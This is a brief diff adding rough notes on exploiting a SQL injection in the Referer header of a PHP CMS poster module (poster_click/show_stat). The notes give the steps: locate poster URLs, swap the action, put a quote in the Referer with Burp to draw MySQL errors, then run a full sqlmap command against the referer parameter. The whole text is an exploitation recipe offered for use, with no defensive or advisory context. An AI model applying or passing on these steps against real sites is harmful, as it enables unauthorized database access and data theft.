@@ -1,0 +1,9 @@
+http://root/index.php?m=poster&c=index&a=poster_click&id=16 
+
+search site  url wtih id then use burp to find http://root/index.php?m=poster&c=index&a=show_poster&id=12
+
+modif show_poster to poster_click or show_stat(show_stat this may need login a member use cookie to inject);
+then in the burp modfi referer to just numbers,use string ' replay the url if you get the mysql wrong errors
+
+go to use sqlmap like this:
+./sqlmap.py -u "http://root/index.php?m=poster&c=index&a=poster_click&id=16" --referer="0" -p referer --level=5 -v 3 
